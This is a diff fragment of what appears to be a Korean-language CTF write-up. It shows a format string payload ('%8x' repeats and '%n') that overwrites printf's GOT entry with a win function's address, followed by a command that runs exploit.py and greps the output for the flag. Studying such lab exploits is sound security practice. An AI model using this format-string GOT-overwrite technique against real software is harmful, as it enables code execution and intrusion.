@@ -45,3 +45,11 @@ gdb-peda$ x/100wx $esp
 
 > %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %134514150x %n : printf의 got를 0x080485bd(win함수의 주소)로 변경
 
+
+
+
+##### exploit
+
+`python exploit.py | grep KCTF`
+
+포맷스트링 버그라 출력되는게 엄청 많으니 다음과 같이 플래그만 출력시킬 것!
